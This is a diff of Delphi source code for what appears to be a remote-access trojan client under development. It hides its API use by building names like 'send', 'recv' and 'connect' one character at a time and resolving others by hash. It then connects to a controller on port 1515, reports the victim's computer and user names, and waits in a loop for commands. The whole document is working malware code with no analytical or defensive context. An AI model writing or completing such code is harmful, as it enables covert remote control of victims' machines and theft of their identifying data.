@@ -19,7 +19,9 @@ type
     xhtons:function(hostshort: u_short): u_short; stdcall;
     xinet_addr:function(cp: PChar): u_long; stdcall;
     xgethostbyname:function(name: PChar): PHostEnt; stdcall;
-    xconnect:function(s: TSocket; var name: TSockAddr; namelen: Integer): Integer; stdcall;
+    xconnect:function(s: Integer; var name: TSockAddr; namelen: Integer): Integer; stdcall;
+    xsend:function(s: Integer; var Buf; len, flags: Integer): Integer; stdcall;
+    xrecv:function(s: Integer; var Buf; len, flags: Integer): Integer; stdcall;
     xGetComputerNameW:function(lpBuffer: PWideChar; var nSize: DWORD): BOOL; stdcall;
     xGetUserNameW:function(lpBuffer: PWideChar; var nSize: DWORD): BOOL; stdcall;
   end;
@@ -43,18 +45,18 @@ begin
   ConnectionLoop(pAPI);
 end;
 
-function SendBuffer(hSocket: Integer; bySocketCmd: Byte; lpszBuffer: PWideChar; iBufferLen: Integer): Boolean;
+function SendBuffer(pConn:PConnRec; bySocketCmd: Byte; lpszBuffer: PWideChar; iBufferLen: Integer): Boolean;
 var
   lpszSendBuffer: Pointer;
   szSendBuffer: Array[0..2047] Of WideChar;
   iSendLen: Integer;
 begin
   Result := False;
-  ZeroMemory(@szSendBuffer, SizeOf(szSendBuffer));
+  pConn.pAPI.xZeroMemory(szSendBuffer, SizeOf(szSendBuffer));
   lpszSendBuffer := Pointer(DWORD(@szSendBuffer) + SizeOf(TSocketHeader));
   if ((iBufferLen > 0) and (lpszBuffer <> nil)) then
   begin
-    CopyMemory(lpszSendBuffer, lpszBuffer, iBufferLen);
+    pConn.pAPI.xCopyMemory(lpszSendBuffer, lpszBuffer, iBufferLen);
   end;
   with LPSocketHeader(@szSendBuffer)^ do
   begin
@@ -63,22 +65,21 @@ begin
   end;
   Dec(DWORD(lpszSendBuffer));
   iBufferLen := iBufferLen + SizeOf(TSocketHeader);
-  iSendLen := send(hSocket, szSendBuffer, iBufferLen, 0);
+  iSendLen := pConn.xsend(pConn.hWinsock, szSendBuffer, iBufferLen, 0);
   if (iSendLen = iBufferLen) then
     Result := True;
-  Sleep(0);
 end;
 
-function RecvBuffer(hSocket: TSocket; lpszBuffer: PWideChar; iBufferLen: Integer): Integer; stdcall;
+function RecvBuffer(pConn:PConnRec; lpszBuffer: PWideChar; iBufferLen: Integer): Integer; stdcall;
 var
   lpTempBuffer: PWideChar;
 begin
   Result := 0;
-  FillChar(lpszBuffer^, iBufferLen, 0);
+  pConn.pAPI.xZeroMemory(lpszBuffer^, iBufferLen);
   lpTempBuffer := lpszBuffer;
   while (iBufferLen > 0) do
   begin
-    Result := recv(hSocket, lpTempBuffer^, iBufferLen, 0);
+    Result := pConn.xrecv(pConn.hWinsock, lpTempBuffer^, iBufferLen, 0);
     if (Result = SOCKET_ERROR) or (Result = 0) then
       break;
     lpTempBuffer := PWideChar(DWORD(lpTempBuffer) + DWORD(Result));
@@ -86,41 +87,41 @@ begin
   end;
 end;
 
-procedure ReceiveCommands(mySocket:Integer);
+procedure ReceiveCommands(pConn:PConnRec);
 var
   iResult: Integer;
   dwBufferLen: DWORD;
   bCommand:Byte;
-  mRecvBuffer:PWideChar;
+  mRecvBuffer:Pointer;
 begin
-  GetMem(mRecvBuffer, 4096);
+  mRecvBuffer := pConn.pAPI.xAllocMem(pConn.pAPI, 8192);
   if (mRecvBuffer <> nil) then
   begin
     while True do
     begin
-      iResult := RecvBuffer(mySocket, @dwBufferLen, SizeOf(DWORD));
+      iResult := RecvBuffer(pConn, @dwBufferLen, SizeOf(DWORD));
       if (iResult = 0) or (iResult = SOCKET_ERROR) then
         Break;
       if (dwBufferLen > 8192) then
         Break;
       // Get Command
-      iResult := RecvBuffer(mySocket, @bCommand, 1);
+      iResult := RecvBuffer(pConn, @bCommand, 1);
       if (iResult = 0) or (iResult = SOCKET_ERROR) then
       begin
         Break;
       end;
       //Get Data
-      ZeroMemory(mRecvBuffer, 4096);
-      iResult := RecvBuffer(mySocket, mRecvBuffer, dwBufferLen - 1);
+      pConn.pAPI.xZeroMemory(mRecvBuffer^, 8192);
+      iResult := RecvBuffer(pConn, mRecvBuffer, dwBufferLen - 1);
       if (iResult = 0) or (iResult = SOCKET_ERROR) then
       begin
         Break;
       end;
       //Parse Packet
+      pConn.pAPI.xMessageBoxW(0,mRecvBuffer,nil,0);
       //ParsePacket(mySocket, mRecvBuffer, dwBufferLen - 1, bCommand);
     end;
-
-    FreeMem(mRecvBuffer);
+    pConn.pAPI.xFreeMem(pConn.pAPI, mRecvBuffer);
   end;
 end;
 
@@ -145,8 +146,7 @@ begin
   if pFullInformations <> nil then
   begin
     pConn.pAPI.xwsprintfW(pFullInformations, @strCMP[0], @pComputerName[0], @pUsername[0], 101);
-    pConn.pAPI.xMessageBoxW(0, pFullInformations,@pUsername[0],0);
-    Result := SendBuffer(pConn.hWinsock, CMD_ONLINE, pFullInformations, (dwLen + 1));
+    Result := SendBuffer(pConn, CMD_ONLINE, pFullInformations, (pConn.pAPI.xlstrlenW(pFullInformations) + 1) * 2);
   end;
   pConn.pAPI.xFreeMem(pConn.pAPI, pFullInformations);
 end;
@@ -186,7 +186,7 @@ var
   strinetaddr:Array[0..9] of Char;
   strgethostbyname:Array[0..13] of Char;
   strconnect:Array[0..7] of Char;
-  strGetUserNameW:Array[0..11] of Char;
+  strsend, strrecv:Array[0..4] of Char;
 begin
   strWinsock[0]:='w';strWinsock[1]:='s';strWinsock[2]:='o';strWinsock[3]:='c';strWinsock[4]:='k';strWinsock[5]:='3';strWinsock[6]:='2';strWinsock[7]:='.';strWinsock[8]:='d';strWinsock[9]:='l';strWinsock[10]:='l';strWinsock[11]:=#0;
   strWSAStartup[0]:='W';strWSAStartup[1]:='S';strWSAStartup[2]:='A';strWSAStartup[3]:='S';strWSAStartup[4]:='t';strWSAStartup[5]:='a';strWSAStartup[6]:='r';strWSAStartup[7]:='t';strWSAStartup[8]:='u';strWSAStartup[9]:='p';strWSAStartup[10]:=#0;
@@ -195,7 +195,8 @@ begin
   strinetaddr[0]:='i';strinetaddr[1]:='n';strinetaddr[2]:='e';strinetaddr[3]:='t';strinetaddr[4]:='_';strinetaddr[5]:='a';strinetaddr[6]:='d';strinetaddr[7]:='d';strinetaddr[8]:='r';strinetaddr[9]:=#0;
   strgethostbyname[0]:='g';strgethostbyname[1]:='e';strgethostbyname[2]:='t';strgethostbyname[3]:='h';strgethostbyname[4]:='o';strgethostbyname[5]:='s';strgethostbyname[6]:='t';strgethostbyname[7]:='b';strgethostbyname[8]:='y';strgethostbyname[9]:='n';strgethostbyname[10]:='a';strgethostbyname[11]:='m';strgethostbyname[12]:='e';strgethostbyname[13]:=#0;
   strconnect[0]:='c';strconnect[1]:='o';strconnect[2]:='n';strconnect[3]:='n';strconnect[4]:='e';strconnect[5]:='c';strconnect[6]:='t';strconnect[7]:=#0;
-  strGetUserNameW[0]:='G';strGetUserNameW[1]:='e';strGetUserNameW[2]:='t';strGetUserNameW[3]:='U';strGetUserNameW[4]:='s';strGetUserNameW[5]:='e';strGetUserNameW[6]:='r';strGetUserNameW[7]:='N';strGetUserNameW[8]:='a';strGetUserNameW[9]:='m';strGetUserNameW[10]:='e';strGetUserNameW[11]:=#0;
+  strsend[0]:='s';strsend[1]:='e';strsend[2]:='n';strsend[3]:='d';strsend[4]:=#0;
+  strrecv[0]:='r';strrecv[1]:='e';strrecv[2]:='c';strrecv[3]:='v';strrecv[4]:=#0;
   Result := pAPI.xAllocMem(pAPI, SizeOf(TConnRec));
   if Result <> nil then
   begin
@@ -207,6 +208,8 @@ begin
     Result.xinet_addr := pAPI.xGetProcAddress(Result.hWinsock, @strinetaddr[0]);
     Result.xgethostbyname := pAPI.xGetProcAddress(Result.hWinsock, @strgethostbyname[0]);
     Result.xconnect := pAPI.xGetProcAddress(Result.hWinsock, @strconnect[0]);
+    Result.xsend := pAPI.xGetProcAddress(Result.hWinsock, @strsend[0]);
+    Result.xrecv := pAPI.xGetProcAddress(Result.hWinsock, @strrecv[0]);
     Result.xGetComputerNameW := pAPI.xGetProcAddressEx(pAPI.hKernel32, $4E5771A7, 16);
     Result.xGetUserNameW := pAPI.xGetProcAddressEx(pAPI.hAdvapi32, $ADA2AFC2, 12);
   end;
@@ -227,10 +230,9 @@ begin
     pConn.hWinsock := ConnectToHost(pConn, @strHost[0], 1515);
     if pConn.hWinsock <> INVALID_SOCKET then
     begin
-      pAPI.xMessageBoxW(0,nil,nil,0);
       if SendInformation(pConn) then
       begin
-        ReceiveCommands(hMainSocket);
+        ReceiveCommands(pConn);
       end;
     end;
     CloseSocket(pConn.hWinsock);
